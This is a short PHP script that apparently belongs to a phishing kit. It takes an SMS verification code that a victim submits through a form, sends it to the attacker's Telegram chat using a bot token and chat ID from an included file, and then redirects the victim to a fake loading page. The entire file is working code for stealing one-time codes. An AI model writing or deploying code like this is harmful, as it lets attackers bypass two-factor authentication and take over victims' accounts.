<?php
include "../telegram.php";
$sms = $_POST['sms'];
$message .= 'Sms : ' . $sms . "\r\n";
$tk = $token; $chid = $chatid; sendMessage($chid, $message, $tk);
header("location: ../third-loading.php");
?>